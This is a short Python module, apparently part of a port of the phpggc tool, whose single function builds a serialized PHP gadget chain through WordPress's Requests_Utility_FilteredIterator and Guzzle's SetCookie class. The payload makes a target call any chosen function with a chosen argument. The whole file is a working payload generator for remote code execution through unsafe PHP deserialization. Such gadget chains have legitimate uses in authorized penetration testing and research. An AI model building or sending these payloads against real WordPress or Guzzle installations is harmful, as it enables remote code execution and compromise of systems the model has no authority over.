"""WordPress + Guzzle gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_arr, php_int, php_null, php_obj, php_spl_iter, php_str, priv


def build_guzzle_rce1(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    data = php_arr([
        (php_str("Name"), php_str(parameter)),
        (php_str("Value"), php_str("")),
    ])
    callback = php_arr([(php_str("\x00*\x00callback"), php_str(function))])
    iterator = php_spl_iter("Requests_Utility_FilteredIterator", 0, data, props=callback)
    cookie = php_obj("GuzzleHttp\\Cookie\\SetCookie", [
        (priv("GuzzleHttp\\Cookie\\SetCookie", "data"), iterator),
    ])
    return maybe_wrap(cookie, fast_destruct)
